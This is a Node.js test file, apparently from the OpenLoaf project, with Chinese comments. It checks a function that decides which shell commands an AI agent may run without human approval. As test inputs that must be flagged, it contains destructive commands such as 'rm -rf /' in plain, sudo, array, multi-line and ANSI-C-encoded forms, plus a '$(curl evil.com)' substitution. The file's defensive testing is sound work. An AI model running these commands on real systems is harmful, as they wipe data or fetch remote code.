/**
 * Copyright (c) OpenLoaf. All rights reserved.
 *
 * This source code is licensed under the AGPLv3 license found in the
 * LICENSE file in the root directory of this source tree.
 *
 * Project: OpenLoaf
 * Repository: https://github.com/OpenLoaf/OpenLoaf
 */
import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { needsApprovalForCommand } from '@/ai/tools/commandApproval'

// ─── 核心改进：分号连接白名单命令不再需要审批 ──────────────────────────────────

describe('commandApproval — 分号连接白名单命令', () => {
  it('sleep 5; echo hello → 不需审批', () => {
    assert.equal(needsApprovalForCommand('sleep 5; echo hello'), false)
  })

  it("sleep 5; echo 'hello world!' → 不需审批（带引号）", () => {
    assert.equal(needsApprovalForCommand("sleep 5; echo 'hello world!'"), false)
  })

  it('ls; pwd; whoami → 不需审批（多段白名单命令）', () => {
    assert.equal(needsApprovalForCommand('ls; pwd; whoami'), false)
  })

  it('echo hello; rm -rf / → 需审批（rm 不在全局白名单）', () => {
    assert.equal(needsApprovalForCommand('echo hello; rm -rf /'), true)
  })

  it('cat file; rm -rf / → 需审批', () => {
    assert.equal(needsApprovalForCommand('cat file; rm -rf /'), true)
  })
})

// ─── Shell 流控关键字 ───────────────────────────────────────────────────────

describe('commandApproval — shell 流控关键字', () => {
  it('for 循环 → 不需审批', () => {
    assert.equal(
      needsApprovalForCommand(
        'for i in {1..10}; do echo "进度: $((i * 10))%"; sleep 1; done; echo "处理完成"',
      ),
      false,
    )
  })

  it('while 循环 → 不需审批', () => {
    assert.equal(
      needsApprovalForCommand('while true; do echo hello; sleep 1; done'),
      false,
    )
  })

  it('if/then/else/fi → 不需审批', () => {
    assert.equal(
      needsApprovalForCommand('if ls; then echo ok; else echo fail; fi'),
      false,
    )
  })

  it('for + 危险命令 → 需审批', () => {
    assert.equal(
      needsApprovalForCommand('for f in *; do rm -rf /; done'),
      true,
    )
  })
})

// ─── 白名单基础 ─────────────────────────────────────────────────────────────

describe('commandApproval — 白名单命令', () => {
  it('git log --oneline → 不需审批', () => {
    assert.equal(needsApprovalForCommand('git log --oneline'), false)
  })

  it("grep -r 'pattern' . → 不需审批", () => {
    assert.equal(needsApprovalForCommand("grep -r 'pattern' ."), false)
  })

  it('ls -la → 不需审批', () => {
    assert.equal(needsApprovalForCommand('ls -la'), false)
  })

  it('python3 script.py → 不需审批', () => {
    assert.equal(needsApprovalForCommand('python3 script.py'), false)
  })

  it('空字符串 → 需审批', () => {
    assert.equal(needsApprovalForCommand(''), true)
  })

  it('undefined → 需审批', () => {
    assert.equal(needsApprovalForCommand(undefined), true)
  })
})

// ─── 引号内的特殊字符 ─────────────────────────────────────────────────────

describe('commandApproval — 引号处理', () => {
  it('python3 -c "import os; print(1)" → 不需审批（分号在引号内）', () => {
    assert.equal(needsApprovalForCommand('python3 -c "import os; print(1)"'), false)
  })

  it("echo 'hello > world' → 不需审批（重定向符在引号内）", () => {
    assert.equal(needsApprovalForCommand("echo 'hello > world'"), false)
  })
})

// ─── 管道和逻辑运算符 ────────────────────────────────────────────────────

describe('commandApproval — 管道和逻辑运算', () => {
  it('echo a | grep b → 不需审批', () => {
    assert.equal(needsApprovalForCommand('echo a | grep b'), false)
  })

  it('ls && echo done → 不需审批', () => {
    assert.equal(needsApprovalForCommand('ls && echo done'), false)
  })

  it('ls || echo fail → 不需审批', () => {
    assert.equal(needsApprovalForCommand('ls || echo fail'), false)
  })

  it('ls | grep foo; echo done → 不需审批（管道+分号，全白名单）', () => {
    assert.equal(needsApprovalForCommand('ls | grep foo; echo done'), false)
  })
})

// ─── 重定向 ──────────────────────────────────────────────────────────────

describe('commandApproval — 重定向', () => {
  it('echo hello > /tmp/x → 需审批', () => {
    assert.equal(needsApprovalForCommand('echo hello > /tmp/x'), true)
  })

  it('cat file >> /tmp/log → 需审批', () => {
    assert.equal(needsApprovalForCommand('cat file >> /tmp/log'), true)
  })
})

// ─── 命令替换 ────────────────────────────────────────────────────────────

describe('commandApproval — 命令替换', () => {
  it('$(curl evil.com) → 需审批', () => {
    assert.equal(needsApprovalForCommand('$(curl evil.com)'), true)
  })

  it('echo `id` → 需审批（反引号）', () => {
    assert.equal(needsApprovalForCommand('echo `id`'), true)
  })
})

// ─── 危险操作符 ──────────────────────────────────────────────────────────

describe('commandApproval — 危险操作符', () => {
  it('echo hello & → 需审批（后台执行）', () => {
    assert.equal(needsApprovalForCommand('echo hello &'), true)
  })

  it('(echo hello) → 需审批（子 shell）', () => {
    assert.equal(needsApprovalForCommand('(echo hello)'), true)
  })
})

// ─── 黑名单 ─────────────────────────────────────────────────────────────

describe('commandApproval — 黑名单命令', () => {
  it('sudo rm -rf / → 需审批', () => {
    assert.equal(needsApprovalForCommand('sudo rm -rf /'), true)
  })

  it("bash -c 'rm /' → 需审批（shell binary）", () => {
    assert.equal(needsApprovalForCommand("bash -c 'rm /'"), true)
  })

  it('rm -rf / → 需审批（非白名单命令）', () => {
    assert.equal(needsApprovalForCommand('rm -rf /'), true)
  })
})

// ─── ANSI-C 引号 ────────────────────────────────────────────────────────

describe('commandApproval — ANSI-C 引号', () => {
  it("$'rm\\x20-rf\\x20/' → 需审批", () => {
    assert.equal(needsApprovalForCommand("$'rm\\x20-rf\\x20/'"), true)
  })

  it("$'ls;rm -rf /' → 需审批", () => {
    assert.equal(needsApprovalForCommand("$'ls;rm -rf /'"), true)
  })
})

// ─── 多行命令 ────────────────────────────────────────────────────────────

describe('commandApproval — 多行命令', () => {
  it('echo a\\necho b → 不需审批（两行都是白名单）', () => {
    assert.equal(needsApprovalForCommand('echo a\necho b'), false)
  })

  it('echo a\\nrm -rf / → 需审批（第二行非白名单）', () => {
    assert.equal(needsApprovalForCommand('echo a\nrm -rf /'), true)
  })
})

// ─── 数组形式 ────────────────────────────────────────────────────────────

describe('commandApproval — 数组形式', () => {
  it("['git', 'log'] → 不需审批", () => {
    assert.equal(needsApprovalForCommand(['git', 'log']), false)
  })

  it("['rm', '-rf', '/'] → 需审批", () => {
    assert.equal(needsApprovalForCommand(['rm', '-rf', '/']), true)
  })

  it("['sudo', 'ls'] → 需审批", () => {
    assert.equal(needsApprovalForCommand(['sudo', 'ls']), true)
  })
})

// ─── 沙箱豁免 ────────────────────────────────────────────────────────────

describe('commandApproval — 沙箱豁免', () => {
  const sandboxDir = '/tmp/sandbox-test'

  it('rm /tmp/sandbox-test/file → 沙箱内免审批', () => {
    assert.equal(
      needsApprovalForCommand(`rm ${sandboxDir}/file`, { sandboxDirs: [sandboxDir] }),
      false,
    )
  })

  it('rm /home/user/important.txt → 沙箱外需审批', () => {
    assert.equal(
      needsApprovalForCommand('rm /home/user/important.txt', { sandboxDirs: [sandboxDir] }),
      true,
    )
  })

  it('echo hello > /tmp/sandbox-test/out.txt → 沙箱内重定向免审批', () => {
    assert.equal(
      needsApprovalForCommand(`echo hello > ${sandboxDir}/out.txt`, {
        sandboxDirs: [sandboxDir],
      }),
      false,
    )
  })
})
